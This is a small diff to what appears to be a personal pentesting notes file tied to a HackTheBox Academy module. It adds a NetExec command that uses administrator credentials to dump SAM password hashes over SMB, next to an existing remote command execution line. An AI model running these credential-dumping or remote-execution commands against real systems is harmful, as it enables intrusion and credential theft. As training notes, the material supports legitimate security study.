@@ -100,7 +100,10 @@ nxc smb <ip> -u <username> -p '<password>' -x '<command>'
 #Replace -x with -X if we need powershell instead of cmd
 ```
 
-NetExec()
+NetExec(Extracting Hash):
+```
+nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+```
 
 
 Ref: https://academy.hackthebox.com/app/module/112/section/1067
